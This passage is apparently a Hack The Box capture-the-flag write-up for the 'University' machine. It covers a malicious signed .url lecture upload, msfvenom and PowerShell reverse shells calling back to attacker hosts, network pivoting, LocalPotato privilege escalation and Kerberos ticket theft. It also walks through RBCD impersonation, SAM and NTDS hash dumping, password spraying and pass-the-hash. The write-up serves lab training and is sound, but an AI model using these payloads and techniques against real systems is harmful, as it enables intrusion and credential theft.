+cJxT1hFdCYlYZ1chHGSU6yRArmoGiIOjM/19yDhzjiRyd8MeosIl2Vq/czA=
+-----END CERTIFICATE-----</code></pre>
+</doc-codeblock></div>
+<p>Slide into the site as Martin.</p>
+<p><figure class="content-center">
+    <img src="../../../../assets/images/writeups/university/lecture-upload.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<p>Professors can upload lectures, but the files need to be signed. Cool, so I spin up a GPG key for our fake professor and decide to get messy with it.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ gpg --gen-key
+
+Real name: martin.rose
+Email address: martin.rose@hotmail.com
+You selected this USER-ID:
+    &quot;martin.rose &lt;martin.rose@hotmail.com&gt;&quot;
+
+$ gpg --export -a &quot;martin.rose&quot; &gt; GPG-public-key.asc</code></pre>
+</doc-codeblock></div>
+<p>A <code v-pre>.url</code> file in our ZIP? Oh yeah, that’s free real estate for pointing to malicious scripts. Drop a batch file on <code v-pre>C:\Windows\Temp</code>, zip a link to it, sign it, upload it. Wait for the magic...</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ cat link.url 
+[InternetShortcut]
+URL=file://C:/Windows/Temp/shell.bat
+$ msfvenom -p cmd/windows/reverse_powershell lhost=10.10.14.65 lport=1337 &gt; rev.bat
+
+$ zip Lecture.zip link.url
+$ gpg -u &quot;martin.rose&quot; --detach-sign Lecture.zip</code></pre>
+</doc-codeblock></div>
+<p>Except... crickets. No callback. Alright, pivot time. Ping sweep the <code v-pre>192.168.99.0/24</code> subnet, find <code v-pre>WS-3</code> and <code v-pre>LAB-2</code> just chilling. Fire up <a href="https://github.com/nicocha30/ligolo-ng">Ligolo-ng</a>, proxy up, route the subnet, and remote into WS-3 like it’s my side chick.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ sudo ip tuntap add user $USER mode tun ligolo
+$ sudo ip link set ligolo up
+$ ./proxy -selfcert -laddr 0.0.0.0:11601 
+
+PS C:\Windows\Temp&gt; ./agent.exe -connect 10.10.14.65:11601 -ignore-cert
+
+$ sudo ip route add 192.168.99.0/24 dev ligolo
+$ evil-winrm -i 192.168.99.2 -u 'wao' -p 'WebAO1337'</code></pre>
+</doc-codeblock></div>
+<p>We can also SSH into LAB-2 with WAO’s creds and immediately <code v-pre>sudo su</code> into root — easiest W of my life.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ ssh wao@192.168.99.12
+wao@192.168.99.12's password: WebAO1337
+
+$ sudo su
+root@LAB-2:#</code></pre>
+</doc-codeblock></div>
+<p>Alright, so plot twist time — instead of begging the main server to run our payload, we switch to “what if WS-3 does the heavy lifting?” energy. The idea: if a file gets opened from WS-3, we can make it point straight to LAB-2 and skip all the drama. So I tweak my reverse shell to target <code v-pre>LAB-2</code>&#x27;s IP (192.168.99.12) instead:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ msfvenom -p cmd/windows/reverse_powershell lhost=192.168.99.12 lport=1337 &gt; rev.bat
+
+*Evil-WinRM* PS C:\Windows\Temp&gt; hostname
+WS-3
+*Evil-WinRM* PS C:\Windows\Temp&gt; upload shell.bat</code></pre>
+</doc-codeblock></div>
+<p>Now the plan is simple: craft the .url file so it points at that batch file living on WS-3. As soon as some unsuspecting professor/admin clicks the shortcut, WS-3 will execute it, and boom — the callback will land right in LAB-2’s waiting arms.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">root@LAB-2:# nc -nlvp 1337
+Listening on [0.0.0.0]
+Connection from 192.168.99.2 59755 received!
+
+C:\Users\Martin.T\Desktop&gt;type README.txt
+
+Hello Professors.
+We have created this note for all the users on the domain computers: WS-1, WS-2 and WS-3.
+These computers have not been updated since 10/29/2023.
+Since these devices are used for content evaluation purposes, they should always have the latest security updates.
+So please be sure to complete your current assessments and move on to the computers &quot;WS-4&quot; and &quot;WS-5&quot;.
+The security team will begin working on the updates and applying new security policies early next month.
+Best regards.
+Help Desk team - Rose Lanosta.</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="root">
+    <h1>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#root">#</doc-anchor-trigger>
+        <span>Root</span>
+    </h1>
+</doc-anchor-target>
+<p>Right — now that we’ve got <code v-pre>Martin.T</code> on <code v-pre>WS-3</code>, that “not updated since 10/29/2023” note is basically a neon sign saying “Potato season is open”. The date is hinting to the latest Potato exploit called <a href="https://github.com/decoder-it/LocalPotato">LocalPotato</a> (a.k.a CVE-2023-21746). This exploit makes it possible to overwrite any file on the server, so let&#x27;s look for things that seem worthwhile.</p>
+<p>One file at <code v-pre>C:\Program Files\Automation-Scripts\wpad-cache-cleaner.ps1</code> seems to be an automated cleanup script. If this script runs with higher privileges (scheduled task, service, or startup script), swapping it out for our payload means the next time it runs, we get a SYSTEM or admin shell.</p>
+<p>We will create the following <code v-pre>shell.ps1</code> reverse shell script and then upload it to <code v-pre>WS-3</code>:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-powershell"><code v-pre class="language-powershell">$client = New-Object System.Net.Sockets.TCPClient('192.168.99.12',443);
+$stream = $client.GetStream();
+[byte[]]$bytes = 0..65535|%{0};
+while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
+    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
+    $sendback = (iex &quot;. { $data } 2&gt;&amp;1&quot; | Out-String );
+    $sendback2 = $sendback + 'PS ' + (pwd).Path + '&gt; ';
+    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
+    $stream.Write($sendbyte,0,$sendbyte.Length);
+    $stream.Flush()
+};
+$client.Close()</code></pre>
+</doc-codeblock></div>
+<p>Now we perform the Potato exploit and start a new netcat listener on <code v-pre>LAB-2</code>.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-powershell"><code v-pre class="language-powershell">C:\tmp&gt; .\potato.exe -i C:\tmp\shell.ps1 -o &quot;\Program Files\Automation-Scripts\wpad-cache-cleaner.ps1&quot;
+.\potato.exe -i C:\tmp\shell.ps1 -o &quot;Program Files\Automation-Scripts\wpad-cache-cleaner.ps1&quot;
+
+     LocalPotato (aka CVE-2023-21746 &amp; HTTP/WebDAV) 
+     by splinter_code &amp; decoder_it
+
+[*] Objref Moniker Display Name = objref:TUVPVwEAAAAAAAAAAAAAAMAAAAAAAABGAQAAAAAAAAC/ZTEHh2lnXwwz8QljdkPFAbQAADQMEA/tQveHVe57FisAFQAHAFcAUwAtADMAAAAHADEAOQAyAC4AMQA2ADgALgA5ADkALgAyAAAAAAAJAP//AAAeAP//AAAQAP//AAAKAP//AAAWAP//AAAfAP//AAAOAP//AAAAAA==:
+[*] Calling CoGetInstanceFromIStorage with CLSID:{854A20FB-2D44-457D-992F-EF13785D2B51}
+[*] Marshalling the IStorage object... IStorageTrigger written: 100 bytes
+[*] Received DCOM NTLM type 1 authentication from the privileged client
+[*] Connected to the SMB server with ip 127.0.0.1 and port 445
+[+] SMB Client Auth Context swapped with SYSTEM 
+[+] RPC Server Auth Context swapped with the Current User
+[*] Received DCOM NTLM type 3 authentication from the privileged client
+[+] SMB reflected DCOM authentication succeeded!
+[+] SMB Connect Tree: \\127.0.0.1\c$  success
+[+] SMB Create Request File: Program Files\Automation-Scripts\wpad-cache-cleaner.ps1 success
+[+] SMB Write Request file: Program Files\Automation-Scripts\wpad-cache-cleaner.ps1 success
+[+] SMB Close File success
+[+] SMB Tree Disconnect success</code></pre>
+</doc-codeblock></div>
+<p>Boom — potato’s baked and served. After sitting there like a sniper in the bushes for ~10+ minutes, the task finally ran and called our reverse shell.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">root@LAB-2:/# sudo nc -nvlp 443
+Listening on [0.0.0.0] (family 0, port 443)
+Connection from 192.168.99.2 59755 received!
+
+PS C:\Windows\system32&gt; whoami
+ws-3\administrator</code></pre>
+</doc-codeblock></div>
+<p>That’s full local admin on <code v-pre>WS-3</code>. Now there are several ways to get the root flag.</p>
+<doc-anchor-target id="method-1">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#method-1">#</doc-anchor-trigger>
+        <span>Method 1</span>
+    </h2>
+</doc-anchor-target>
+<p>Ok so first move — dump any user Kerberos tickets from memory and pray we find one. Run Rubeus, dump all tickets, jackpot — Rose&#x27;s TGT is just sitting there in memory like it’s on clearance. We grab that Base64 ticket, renew it, and inject it straight into our current session with <code v-pre>/ptt</code>.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-powershell"><code v-pre class="language-powershell">PS C:\tmp&gt; .\Rubeus.exe dump /nowrap
+
+ServiceName              :  krbtgt/UNIVERSITY.HTB
+    ServiceRealm             :  UNIVERSITY.HTB
+    UserName                 :  Rose.L
+    UserRealm                :  UNIVERSITY.HTB
+    StartTime                :  12/23/2024 11:13:06 AM
+    EndTime                  :  12/23/2024 9:11:36 PM
+    RenewTill                :  12/30/2024 11:11:36 AM
+    Flags                    :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
+    KeyType                  :  aes256_cts_hmac_sha1
+    Base64(key)              :  yyPBB4KJQdaFY9q/6OOMETkXrf+1N+q4gORS/lQtpME=
+    Base64EncodedTicket      : &lt;ROSE_BASE64_TICKET&gt;
+
+PS C:\tmp&gt; .\Rubeus.exe renew /ticket:&lt;ROSE_BASE64_TICKET&gt; /ptt /nowrap</code></pre>
+</doc-codeblock></div>
+<p>Quick klist check and boom, we’re literally her now.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">PS C:\tmp&gt; klist
+
+Current LogonId is 0:0x3e7
+Cached Tickets: (2)
+
+#0&gt; Client: Rose.L @ UNIVERSITY.HTB
+    Server: krbtgt/UNIVERSITY.HTB @ UNIVERSITY.HTB
+    KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
+    Ticket Flags 0x60a10000 -&gt; forwardable forwarded renewable pre_authent name_canonicalize 
+    Start Time: 12/23/2024 11:26:13 (local)
+    End Time:   12/23/2024 21:24:43 (local)
+    Renew Time: 12/30/2024 11:21:36 (local)
+    Session Key Type: AES-256-CTS-HMAC-SHA1-96
+    Cache Flags: 0x1 -&gt; PRIMARY 
+    Kdc Called: 
+</code></pre>
+</doc-codeblock></div>
+<p>From BloodHound we see Rose has ReadGMSAPassword rights on the GMSA-PClient01$ account. That’s spicy because that means we can read the machine account password and escalate to Domain Admin with an RBCD attack.</p>
+<p><figure class="content-center">
+    <img src="../../../../assets/images/writeups/university/bh.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<p>Drop <code v-pre>GMSAPasswordReader.exe</code>, tell it to target &quot;GMSA-PClient01$&quot;, and it hands over every hash flavor — RC4, AES128, AES256, DES. The RC4 hash is all we need for the next step.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">PS C:\tmp&gt; .\GMSAPasswordReader.exe --AccountName &quot;GMSA-PCLIENT01$&quot;
+Calculating hashes for Old Value
+[*] Input username             : GMSA-PClient01$
+[*] Input domain               : UNIVERSITY.HTB
+[*] Salt                       : UNIVERSITY.HTBGMSA-PClient01$
+[*]       rc4_hmac             : FD089A6CE20FD923CDE921AB727081F7
+[*]       aes128_cts_hmac_sha1 : 8D212E250E2F93327E6BFFFB1F6B84FF
+[*]       aes256_cts_hmac_sha1 : D54377CF68DFFED662689735661C22EA34D8DDCD630A93B0A566A64950C67C3D
+[*]       des_cbc_md5          : 15E515D5CE9D0D7C
+
+Calculating hashes for Current Value
+[*] Input username             : GMSA-PClient01$
+[*] Input domain               : UNIVERSITY.HTB
+[*] Salt                       : UNIVERSITY.HTBGMSA-PClient01$
+[*]       rc4_hmac             : 0D333F335FDA7915C9B62D37056351C6
+[*]       aes128_cts_hmac_sha1 : B2292EB7C52C682DCDF4C7F36E339461
+[*]       aes256_cts_hmac_sha1 : E671040580E4C9A3924F32527A231D0A640F9B02612A768DECC6111F3BA7100F
+[*]       des_cbc_md5          : FB7F0DF2EACE5E76</code></pre>
+</doc-codeblock></div>
+<p>Since <code v-pre>GMSA-PClient01$</code> is AllowedToAct on the DC, we use Rubeus S4U to impersonate the administrator, requesting a service ticket for CIFS and WinRM on the DC. We inject that ticket, klist again, and it straight up says <code v-pre>Client: administrator @ UNIVERSITY.HTB</code>.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">PS C:\tmp&gt; .\Rubeus.exe s4u /user:GMSA-PCLIENT01$ /rc4:0D333F335FDA7915C9B62D37056351C6 /impersonateuser:administrator /msdsspn:cifs/DC.university.htb /altservice:winrm /ptt
+
+PS C:\tmp&gt; klist
+
+Current LogonId is 0:0x3e7
+Cached Tickets: (1)
+
+#0&gt; Client: administrator @ UNIVERSITY.HTB
+    Server: cifs/DC.university.htb @ UNIVERSITY.HTB
+    KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
+    Ticket Flags 0x40a50000 -&gt; forwardable renewable pre_authent ok_as_delegate name_canonicalize 
+    Start Time: 12/23/2024 11:38:39 (local)
+    End Time:   12/23/2024 21:38:37 (local)
+    Renew Time: 12/30/2024 11:38:37 (local)
+    Session Key Type: AES-128-CTS-HMAC-SHA1-96
+    Cache Flags: 0 
+    Kdc Called:
+
+PS C:\tmp&gt; type \\dc.university.htb\c$\users\Administrator\Desktop\root.txt
+&lt;REDACTED&gt;</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="method-2">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#method-2">#</doc-anchor-trigger>
+        <span>Method 2</span>
+    </h2>
+</doc-anchor-target>
+<p>Another option we have is to dump the SAM database (download it with session in Evil-WinRM). Then we run <code v-pre>secretsdump.py</code> to to spit out every hash in the system, including the golden ticket: a default password chilling in plaintext.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">C:\tmp&gt; hostname
+WS-3
+C:\tmp&gt; reg.exe save hklm\sam SAM
+The operation completed successfully.
+C:\tmp&gt; reg.exe save hklm\system SYSTEM
+The operation completed successfully.
+C:\tmp&gt; reg.exe save hklm\security SECURITY
+The operation completed successfully.
+
+$ secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Target system bootKey: 0xcafb76872642f6bc09dd9e17ae7cddec
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:ba76a28db8aaeb636566a414f3e104aa:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:71ffc7b2d302f8059b92219e7d7a7ba1:::
+sshd:1001:aad3b435b51404eeaad3b435b51404ee:a8bf1bae201f988dc1ca99f1043e11dc:::
+
+&lt;SNIP&gt;
+
+[*] DefaultPassword 
+(Unknown User):v3ryS0l!dP@sswd#X
+[*] Cleaning up...</code></pre>
+</doc-codeblock></div>
+<p>We see <code v-pre>v3ryS0l!dP@sswd#X</code> and think: ohhh this is too easy. Password spraying time.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ nxc smb 10.10.11.39 -u ad_users.txt -p 'v3ryS0l!dP@sswd#X' --continue-on-success</code></pre>
+</doc-codeblock></div>
+<p>Run it against <code v-pre>ad_users.txt</code> with NetExec, and guess what? <code v-pre>Brose.W</code> is just waiting there with the same password, Backup Operators group, ripe for some NTDS shadow-copy shenanigans.</p>
+<p><figure class="content-center">
+    <img src="../../../../assets/images/writeups/university/bh-brose.w.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<p>Fire up Evil-WinRM as Brose.W, drop diskshadow <code v-pre>.dsh</code> script, spin up a shadow copy, expose it to Z:, robocopy the NTDS.dit and SYSTEM.SAV like it’s Hot Wheels. Download them, feed them to <code v-pre>secretsdump.py</code>, and it’s raining domain hashes.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ evil-winrm -i 10.10.11.39 -u 'university.htb\brose.w' -p 'v3ryS0l!dP@sswd#X'
+
+*Evil-WinRM* PS C:\Users\Brose.W\Documents&gt; cat vss.dsh
+set context persistent nowriters
+set metadata c:\programdata\df.cab
+set verbose on
+add volume c: alias df
+create
+expose %df% z:
+
+*Evil-WinRM* PS C:\Users\Brose.W\Documents&gt; diskshadow /s C:\Users\Brose.W\Documents\vss.dsh
+
+The shadow copy was successfully exposed as z:\.
+
+*Evil-WinRM* PS C:\Users\Brose.W\Documents&gt; robocopy /B Z:\Windows\NTDS .\ntds.dit
+*Evil-WinRM* PS C:\Users\Brose.W\Documents&gt; ls
+    Directory: C:\Users\Brose.W\Documents
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----       12/23/2024   3:01 AM       16777216 ntds.dit
+-a----       12/23/2024   1:14 PM            134 vss.dsh
+
+*Evil-WinRM* PS C:\Users\Brose.W\Documents&gt; download ntds.dit
+*Evil-WinRM* PS C:\Users\Brose.W\Documents&gt; reg save HKLM\SYSTEM SYSTEM.SAV
+*Evil-WinRM* PS C:\Users\Brose.W\Documents&gt; download SYSTEM.SAV
+
+$ secretsdump.py -ntds ntds.dit -system SYSTEM.SAV LOCAL
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Target system bootKey: 0x7704a47762a8cd07d2922fc3e97e02a4
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Searching for pekList, be patient
+[*] PEK # 0 found and decrypted: 53baa9d0678f975750cdfcfc8b9e6f42
+[*] Reading and decrypting hashes from ntds.dit 
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:e63413bab01a0b8820983496c0be3a9a:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DC$:1000:aad3b435b51404eeaad3b435b51404ee:2522eb84c83b5e9ffde18045be5b9e59:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:41c4599e48661690fa6538fe96d366de:::
+
+&lt;SNIP&gt;</code></pre>
+</doc-codeblock></div>
+<p>Final move? Administrator hash in hand, Pass-the-Hash time. SMB to the DC, grab root.txt, sit back, sip whatever beverage hackers sip while the domain collapses in slow motion.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ nxc smb 10.10.11.39 -u 'Administrator' -H 'e63413bab01a0b8820983496c0be3a9a' -x 'cat C:\Users\Administrator\Desktop\root.txt'</code></pre>
+</doc-codeblock></div>
+<p>Boom. University.HTB? Ours. Every ticket stolen, every hash cracked, every default password abused. The network? Toast. The flags? Collected. The lesson? One tiny slip in AD, one exposed secret, and the kingdom crumbles. Chaos achieved, mission complete.</p>
+
+                                
+                                <!-- Required only on API pages -->
+                                <doc-toolbar-member-filter-no-results></doc-toolbar-member-filter-no-results>
+                            </div>
+                            <footer id="retype-content-footer" class="clear-both">
+                            
+                                <nav id="retype-nextprev" class="print:hidden flex mt-14">
+                                    <div class="w-1/2">
+                                        <a class="px-5 py-4 h-full flex items-center break-normal font-medium text-body-link border border-base-border hover:border-base-border-hover rounded-l-lg transition-colors duration-150 relative hover:z-5" href="../../../../writeups/hackthebox/machines/office/">
+                                            <svg xmlns="http://www.w3.org/2000/svg" class="mr-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19 11H7.41l5.29-5.29a.996.996 0 10-1.41-1.41l-7 7a1 1 0 000 1.42l7 7a1.024 1.024 0 001.42-.01.996.996 0 000-1.41L7.41 13H19c.55 0 1-.45 1-1s-.45-1-1-1z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
+                                            <span>
+                                                <span class="block text-xs font-normal text-base-text-muted">Previous</span>
+                                                <span class="block mt-1">Office (Hard)</span>
+                                            </span>
+                                        </a>
+                                    </div>
+                            
+                                    <div class="w-1/2">
+                                        <a class="px-5 py-4 -mx-px h-full flex items-center justify-end break-normal font-medium text-body-link border border-base-border hover:border-base-border-hover rounded-r-lg transition-colors duration-150 relative hover:z-5" href="../../../../writeups/hackthebox/machines/vintage/">
+                                            <span>
+                                                <span class="block text-xs font-normal text-right text-base-text-muted">Next</span>
+                                                <span class="block mt-1">Vintage (Hard)</span>
+                                            </span>
+                                            <svg xmlns="http://www.w3.org/2000/svg" class="ml-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19.92 12.38a1 1 0 00-.22-1.09l-7-7a.996.996 0 10-1.41 1.41l5.3 5.3H5c-.55 0-1 .45-1 1s.45 1 1 1h11.59l-5.29 5.29a.996.996 0 000 1.41c.19.2.44.3.7.3s.51-.1.71-.29l7-7c.09-.09.16-.21.21-.33z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
+                                        </a>
+                                    </div>
+                                </nav>
+                            </footer>
+                        </main>
+                
+                        <div id="retype-page-footer" class="print:border-none border-t border-base-border pt-6 mb-8">
+                            <footer class="flex flex-wrap items-center justify-between print:justify-center">
+                                <div id="retype-footer-links" class="print:hidden">
+                                    <ul class="flex flex-wrap items-center text-sm">
+                                    </ul>
+                                </div>
+                                <div id="retype-copyright" class="print:justify-center py-2 text-footer-text font-footer-link-weight text-sm leading-relaxed"><p>© Copyright 2025. All rights reserved.</p></div>
+                            </footer>
+                        </div>
+                    </div>
+                
+                    <!-- Rendered if sidebar right is enabled -->
+                    <!-- Sidebar right skeleton-->
+                    <div v-cloak class="fixed top-0 bottom-0 right-0 translate-x-full bg-sidebar-right-bg border-sidebar-right-border lg:sticky lg:border-l lg:shrink-0 lg:pt-6 lg:transform-none sm:w-1/2 lg:w-64 lg:z-0 md:w-104 sidebar-right skeleton">
+                        <div class="pl-5">
+                            <div class="w-32 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+                            <div class="w-48 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+                            <div class="w-40 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+                        </div>
+                    </div>
+                
+                    <!-- User should be able to hide sidebar right -->
+                    <doc-sidebar-right v-cloak></doc-sidebar-right>
+                </div>
+
+            </div>
+        </div>
+    
+        <doc-search-mobile></doc-search-mobile>
+        <doc-back-to-top></doc-back-to-top>
+    </div>
+
+
+    <div id="retype-overlay-target"></div>
+
+    <script data-cfasync="false">window.__DOCS__ = { "title": "University (Insane)", level: 4, icon: "file", hasPrism: true, hasMermaid: false, hasMath: false, tocDepth: 23 }</script>
+</body>
+</html>
